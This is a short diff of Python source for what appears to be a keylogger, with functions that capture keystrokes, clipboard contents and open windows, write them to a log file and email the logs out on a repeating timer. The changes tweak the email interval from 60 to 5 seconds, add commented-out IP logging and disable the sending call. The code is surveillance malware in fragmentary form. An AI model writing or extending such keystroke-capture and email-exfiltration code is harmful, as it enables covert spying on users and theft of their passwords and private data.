@@ -137,6 +137,8 @@ def capture_key_strokes(event):
         
     # add logs to the file
     output_file.write(logging_output)
+    #output_file.write("IP: ")
+    #output_file.write(get_ip())
     output_file.close()
 
     # get content of the clipboard
@@ -237,7 +239,7 @@ def get_all_open_windows(): # TO-DO: break them into more function
 
 def sending_emails():
     
-    threading.Timer(60,sending_emails).start()
+    threading.Timer(5,sending_emails).start()
     
     # send emails
     send_new_email(folder_path)
@@ -255,7 +257,7 @@ def begin_logging():
     # get active windows:
     get_all_open_windows()
 
-    sending_emails()
+    #sending_emails()
     
 
 
